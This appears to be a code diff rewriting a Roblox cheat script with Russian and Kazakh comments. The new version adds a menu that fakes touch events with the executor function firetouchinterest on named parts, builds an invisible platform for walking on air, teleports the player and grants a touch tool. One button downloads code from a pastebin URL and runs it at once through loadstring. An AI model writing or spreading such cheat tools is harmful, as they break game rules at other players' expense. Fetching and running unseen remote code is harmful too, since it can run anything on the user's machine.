@@ -1,163 +1,235 @@
--- Этот script создан с хакером Hacker_Wilson00
+-- GUI Setup
+local player = game.Players.LocalPlayer
+local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+screenGui.ResetOnSpawn = false
+screenGui.Name = "TouchGUI"
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local UIS = game:GetService("UserInputService")
+-- Draggable Frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 220, 0, 260)
+frame.Position = UDim2.new(0.5, -110, 0.5, -130)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+frame.Parent = screenGui
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
 
--- ScreenGui
-local gui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
-gui.Name = "WilsonHubMenu"
-
--- Domalaq fiolet icon
-local icon = Instance.new("Frame", gui)
-icon.Name = "WilsonIcon"
-icon.Size = UDim2.new(0, 72, 0, 72)
-icon.Position = UDim2.new(0, 30, 0, 120)
-icon.BackgroundColor3 = Color3.fromRGB(130, 0, 255)
-icon.BackgroundTransparency = 0
-icon.BorderSizePixel = 0
-icon.Active = true
-
--- Domalaq форма беру
-local uicorner = Instance.new("UICorner", icon)
-uicorner.CornerRadius = UDim.new(1,0)
-
--- Найзағай (⚡️) белгісі
-local thunder = Instance.new("TextLabel", icon)
-thunder.Size = UDim2.new(1, 0, 0.45, 0)
-thunder.Position = UDim2.new(0, 0, 0.07, 0)
-thunder.BackgroundTransparency = 1
-thunder.Text = "⚡️"
-thunder.TextColor3 = Color3.new(1,1,0.2)
-thunder.Font = Enum.Font.Arcade
-thunder.TextScaled = true
-
--- WILSONHUB жазуы
-local hubText = Instance.new("TextLabel", icon)
-hubText.Size = UDim2.new(1, 0, 0.35, 0)
-hubText.Position = UDim2.new(0, 0, 0.55, 0)
-hubText.BackgroundTransparency = 1
-hubText.Text = "WILSONHUB"
-hubText.TextColor3 = Color3.fromRGB(255,255,255)
-hubText.Font = Enum.Font.SourceSansBold
-hubText.TextScaled = true
-
--- Иконканы жылжыту
-icon.Active = true
-icon.Draggable = true
-
--- Ашылатын меню (қызық түс)
-local menu = Instance.new("Frame", gui)
-menu.Size = UDim2.new(0, 320, 0, 400)
-menu.Position = UDim2.new(0, 120, 0, 80)
-menu.BackgroundColor3 = Color3.fromRGB(255, 92, 172) -- Қызық түс (қызғылт)
-menu.Visible = false
-menu.Active = true
-menu.Draggable = true
-
-local menuCorner = Instance.new("UICorner", menu)
-menuCorner.CornerRadius = UDim.new(0.12,0)
+-- Toggle Button
+local toggleButton = Instance.new("TextButton")
+toggleButton.Size = UDim2.new(0, 120, 0, 30)
+toggleButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+toggleButton.Text = "🔥Меню скрипта🔥"
+toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+toggleButton.Font = Enum.Font.SourceSansBold
+toggleButton.TextSize = 16
+toggleButton.Parent = screenGui
+Instance.new("UICorner", toggleButton).CornerRadius = UDim.new(0, 6)
 
 -- Title
 local title = Instance.new("TextLabel", menu)
 title.Size = UDim2.new(1, 0, 0, 48)
 title.BackgroundTransparency = 1
-title.Text = "Этот script создан с хакером Hacker_Wilson00"
+title.Text = "Этот script создан с скриптером Hack_Wilson"
 title.TextColor3 = Color3.new(1,1,1)
 title.Font = Enum.Font.SourceSansBold
 title.TextSize = 20
 
--- Fire Block кнопка
-local fireBtn = Instance.new("TextButton", menu)
-fireBtn.Text = "Fire Block FE: OFF"
-fireBtn.Size = UDim2.new(1, -40, 0, 50)
-fireBtn.Position = UDim2.new(0, 20, 0, 60)
-fireBtn.BackgroundColor3 = Color3.fromRGB(80, 0, 160)
-fireBtn.TextColor3 = Color3.new(1,1,1)
-fireBtn.Font = Enum.Font.SourceSans
-fireBtn.TextSize = 18
+-- Loop Touch Button
+local loopButton = Instance.new("TextButton")
+loopButton.Size = UDim2.new(1, -20, 0, 35)
+loopButton.Position = UDim2.new(0, 10, 0, 30)
+loopButton.Text = "Fe Fire block: Off"
+loopButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
+loopButton.TextColor3 = Color3.new(1, 1, 1)
+loopButton.Font = Enum.Font.SourceSansBold
+loopButton.TextSize = 18
+loopButton.Parent = frame
+Instance.new("UICorner", loopButton).CornerRadius = UDim.new(0, 10)
 
--- Fly кнопка
-local flyBtn = Instance.new("TextButton", menu)
-flyBtn.Text = "Fly: OFF"
-flyBtn.Size = UDim2.new(1, -40, 0, 50)
-flyBtn.Position = UDim2.new(0, 20, 0, 130)
-flyBtn.BackgroundColor3 = Color3.fromRGB(80, 0, 160)
-flyBtn.TextColor3 = Color3.new(1,1,1)
-flyBtn.Font = Enum.Font.SourceSans
-flyBtn.TextSize = 18
+-- Walk on Air Button
+local airButton = Instance.new("TextButton")
+airButton.Size = UDim2.new(1, -20, 0, 35)
+airButton.Position = UDim2.new(0, 10, 0, 75)
+airButton.Text = "Air fly: Off"
+airButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
+airButton.TextColor3 = Color3.new(1, 1, 1)
+airButton.Font = Enum.Font.SourceSansBold
+airButton.TextSize = 18
+airButton.Parent = frame
+Instance.new("UICorner", airButton).CornerRadius = UDim.new(0, 10)
 
--- Ашып-жабу логикасы
-icon.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        menu.Visible = not menu.Visible
-    end
-end)
+-- Tool Button
+local toolButton = Instance.new("TextButton")
+toolButton.Size = UDim2.new(1, -20, 0, 35)
+toolButton.Position = UDim2.new(0, 10, 0, 120)
+toolButton.Text = "Предмет Fire block"
+toolButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
+toolButton.TextColor3 = Color3.new(1, 1, 1)
+toolButton.Font = Enum.Font.SourceSansBold
+toolButton.TextSize = 18
+toolButton.Parent = frame
+Instance.new("UICorner", toolButton).CornerRadius = UDim.new(0, 10)
 
--- Fire Block FE логикасы (өзінен-өзі жоғалып тұратын блок)
-local fireEnabled = false
-local fireBlock
+-- Teleport Button
+local teleportButton = Instance.new("TextButton")
+teleportButton.Size = UDim2.new(1, -20, 0, 35)
+teleportButton.Position = UDim2.new(0, 10, 0, 165)
+teleportButton.Text = "Teleport to Button"
+teleportButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
+teleportButton.TextColor3 = Color3.new(1, 1, 1)
+teleportButton.Font = Enum.Font.SourceSansBold
+teleportButton.TextSize = 18
+teleportButton.Parent = frame
+Instance.new("UICorner", teleportButton).CornerRadius = UDim.new(0, 10)
 
-local function spawnGhostBlock()
-    while fireEnabled do
-        if fireBlock then fireBlock:Destroy() end
-        fireBlock = Instance.new("Part", workspace)
-        fireBlock.Size = Vector3.new(4,1,4)
-        fireBlock.Position = LocalPlayer.Character and LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0, -3, 0) or Vector3.new(0,0,0)
-        fireBlock.Anchored = true
-        fireBlock.Name = "GhostBlock"
-        fireBlock.BrickColor = BrickColor.new("Royal purple")
-        fireBlock.Transparency = 0.2
-        fireBlock.CanCollide = true
-        wait(1)
-        if fireBlock then fireBlock:Destroy() end
-    end
-    if fireBlock then fireBlock:Destroy() end
+-- Fly GUI Button
+local flyButton = Instance.new("TextButton")
+flyButton.Size = UDim2.new(1, -20, 0, 35)
+flyButton.Position = UDim2.new(0, 10, 0, 210)
+flyButton.Text = "Fly GUI Script"
+flyButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
+flyButton.TextColor3 = Color3.new(1, 1, 1)
+flyButton.Font = Enum.Font.SourceSansBold
+flyButton.TextSize = 18
+flyButton.Parent = frame
+Instance.new("UICorner", flyButton).CornerRadius = UDim.new(0, 10)
+
+-- Touch Simulation Function
+local function touchPartAsync(part)
+	local character = player.Character
+	if not character then return end
+	for _, bodyPart in ipairs(character:GetDescendants()) do
+		if bodyPart:IsA("BasePart") then
+			task.spawn(function()
+				firetouchinterest(bodyPart, part, 0)
+				task.wait(0.05)
+				firetouchinterest(bodyPart, part, 1)
+			end)
+		end
+	end
 end
 
-fireBtn.MouseButton1Click:Connect(function()
-    fireEnabled = not fireEnabled
-    fireBtn.Text = "Fire Block FE: " .. (fireEnabled and "ON" or "OFF")
-    if fireEnabled then
-        spawnGhostBlock()
-    else
-        if fireBlock then fireBlock:Destroy() end
-    end
+-- Loop Touch Logic
+local loopTouching = false
+loopButton.MouseButton1Click:Connect(function()
+	loopTouching = not loopTouching
+	if loopTouching then
+		loopButton.Text = "Fe Fire block: On"
+		loopButton.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
+	else
+		loopButton.Text = "Fe Fire block: Off"
+		loopButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
+	end
+
+	while loopTouching do
+		for _, part in ipairs(workspace:GetDescendants()) do
+			if part:IsA("BasePart") and (part.Name == "사라지는 파트" or part.Name == "Gudock" or part.Name == "Part") then
+				touchPartAsync(part)
+			end
+		end
+		task.wait(1)
+	end
 end)
 
--- Fly функциясы
-local flyEnabled = false
-local flySpeed = 60
-local flyConn
+-- Walk on Air Logic
+local walkOnAir = false
+local airPart = Instance.new("Part")
+airPart.Size = Vector3.new(6, 1, 6)
+airPart.Anchored = true
+airPart.Transparency = 1
+airPart.CanCollide = true
+airPart.Name = "AirPlatform"
+airPart.Parent = workspace
 
-local function flyFunc()
-    local char = LocalPlayer.Character
-    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
-    local hrp = char.HumanoidRootPart
-
-    flyConn = UIS.InputBegan:Connect(function(input, gpe)
-        if gpe then return end
-        if input.KeyCode == Enum.KeyCode.Space then
-            if flyEnabled then
-                hrp.Velocity = Vector3.new(hrp.Velocity.X, flySpeed, hrp.Velocity.Z)
-            end
-        end
-    end)
-    while flyEnabled and char and char:FindFirstChild("HumanoidRootPart") do
-        hrp.Velocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)
-        wait()
-    end
-    if flyConn then flyConn:Disconnect() end
-end
-
-flyBtn.MouseButton1Click:Connect(function()
-    flyEnabled = not flyEnabled
-    flyBtn.Text = "Fly: " .. (flyEnabled and "ON" or "OFF")
-    if flyEnabled then
-        flyFunc()
-    elseif flyConn then
-        flyConn:Disconnect()
-    end
+airButton.MouseButton1Click:Connect(function()
+	walkOnAir = not walkOnAir
+	if walkOnAir then
+		airButton.Text = "Air: On"
+		airButton.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
+	else
+		airButton.Text = "Air: Off"
+		airButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
+		airPart.Position = Vector3.new(0, -500, 0)
+	end
 end)
 
--- Скрипт дайын! Домалақ иконка, найзағай, "WILSONHUB" жазуы, ерекше түсті меню, барлық функциялар бар.
+game:GetService("RunService").RenderStepped:Connect(function()
+	if walkOnAir and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+		local hrp = player.Character.HumanoidRootPart
+		airPart.Position = hrp.Position - Vector3.new(0, 3.5, 0)
+	end
+end)
+
+-- Tool Logic
+toolButton.MouseButton1Click:Connect(function()
+	local backpack = player:FindFirstChildOfClass("Backpack")
+	local existingTool = backpack and backpack:FindFirstChild("Fire Part") or player.Character and player.Character:FindFirstChild("Fire Part")
+
+	toolButton.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
+	task.delay(0.1, function()
+		toolButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
+	end)
+
+	if existingTool then
+		existingTool:Destroy()
+	else
+		local tool = Instance.new("Tool")
+		tool.RequiresHandle = false
+		tool.Name = "Fire Part"
+		tool.Parent = player.Backpack
+		tool.Activated:Connect(function()
+			local mouse = player:GetMouse()
+			if mouse and mouse.Target then
+				touchPartAsync(mouse.Target)
+			end
+		end)
+	end
+end)
+
+-- Teleport Logic
+teleportButton.MouseButton1Click:Connect(function()
+	local gudockPart = workspace:FindFirstChild("Gudock")
+	if gudockPart then
+		player.Character:MoveTo(gudockPart.Position + Vector3.new(0, 5, 0))
+	else
+		print("Gudock part not found!")
+	end
+end)
+
+-- Fly GUI Script Execution
+flyButton.MouseButton1Click:Connect(function()
+	pcall(function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/Y1G9RJgE"))()
+	end)
+end)
+
+-- Notification
+pcall(function()
+	game:GetService("StarterGui"):SetCore("SendNotification", {
+		Title = "Script Loaded!🔥",
+		Text = "Thanks for using my Script!, Enjoy ^^",
+		Duration = 5
+	})
+end)
+
+-- Toggle GUI Visibility
+local shown = true
+toggleButton.MouseButton1Click:Connect(function()
+	shown = not shown
+	frame.Visible = shown
+	toggleButton.Text = shown and "Hide GUI" or "Show GUI"
+end)
+
+-- Keep Toggle Button Above Frame
+game:GetService("RunService").RenderStepped:Connect(function()
+	local framePosition = frame.Position
+	local frameSize = frame.Size
+	local toggleButtonSize = toggleButton.Size
+	toggleButton.Position = UDim2.new(
+		framePosition.X.Scale, framePosition.X.Offset + (frameSize.X.Offset / 2) - (toggleButtonSize.X.Offset / 2),
+		framePosition.Y.Scale, framePosition.Y.Offset - toggleButtonSize.Y.Offset - 5
+	)
+
+end)
